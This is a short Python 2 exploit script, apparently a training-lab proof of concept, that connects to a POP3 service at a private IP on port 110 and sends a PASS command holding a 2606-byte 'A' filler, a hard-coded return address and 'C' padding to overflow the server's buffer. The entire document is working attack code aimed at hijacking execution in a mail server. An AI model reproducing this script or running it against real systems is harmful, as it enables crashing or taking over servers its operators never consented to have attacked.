#!/usr/bin/python
#coding=utf-8
import socket

def main():
	buffer = 'A' * 2606 + "\xe3\x41\x4b\x5f" + 'C' * 390
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		print "\n[*]Sending evil buffer..."
		s.connect(('192.168.220.130', 110))
		s.recv(1024)
		s.send('USER test\r\n')
		s.recv(1024)
		s.send('PASS ' + buffer + '\r\n')
		print "\n[*]Done!"
	except:
		print "[-]Can't connect to POP3 !"

if __name__ == '__main__':
	main()